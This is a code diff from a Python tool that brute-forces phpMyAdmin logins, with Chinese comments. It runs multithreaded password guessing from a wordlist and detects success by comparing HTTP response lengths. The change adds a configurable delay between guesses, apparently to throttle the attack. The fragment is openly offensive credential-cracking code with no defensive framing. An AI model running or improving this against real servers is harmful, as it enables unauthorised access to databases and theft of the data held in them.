@@ -67,13 +67,14 @@ def init(url, uname):
     return token, contentLengthRaw
 
 
-def crack_pma(uname, pwd, token, contentLengthRaw):
+def crack_pma(uname, pwd, token, contentLengthRaw, timeDelay):
     """
 
     :param uname: 用户名
     :param pwd: 密码
     :param token: 登录token
     :param contentLengthRaw: 错误密码的返回的 http 头长度
+    :param timeDelay: 爆破延时时间
     :return:
     """
     r = pma_login(uname, pwd, token)
@@ -100,7 +101,6 @@ def crack_pma(uname, pwd, token, contentLengthRaw):
 if __name__ == '__main__':
     # 线程数量
     theadNum = 16
-
     # 延时 timeDelay s 爆破
     timeDelay = 0
 
@@ -116,7 +116,7 @@ if __name__ == '__main__':
         for pwd in open("password.txt"):
             pwd = pwd.replace("\r", "").replace("\n", "")
 
-            wm.add_job(crack_pma, uname, pwd, token, contentLengthRaw)
+            wm.add_job(crack_pma, uname, pwd, token, contentLengthRaw, timeDelay)
 
     wm.start()
     wm.wait_for_complete()
